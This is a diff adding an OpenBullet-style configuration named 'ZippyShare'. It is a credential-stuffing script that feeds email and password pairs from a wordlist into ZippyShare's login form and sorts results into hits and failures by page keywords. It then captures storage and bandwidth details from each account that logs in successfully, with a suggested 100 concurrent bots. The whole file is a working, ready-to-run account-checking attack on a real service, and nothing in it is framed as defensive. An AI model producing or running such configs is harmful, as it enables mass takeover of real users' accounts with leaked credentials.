@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "ZippyShare",
+  "SuggestedBots": 100,
+  "LastModified": "2019-01-08T16:57:38.9635882+07:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserMail",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.zippyshare.com/services/login" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.zippyshare.com" 
+  HEADER "Origin: https://www.zippyshare.com" 
+  HEADER "Referer: https://www.zippyshare.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY " Sign Up!" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+REQUEST GET "https://www.zippyshare.com/sites/priv/myAccount.jsp" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "color: #555555;\">" "</div>" Recursive=FALSE -> CAP "Total Storage Used" "" "" 
+PARSE "<SOURCE>" LR "color: #555555;\">" "</div>" Recursive=FALSE -> CAP "Bandwidth Served" "" "" 
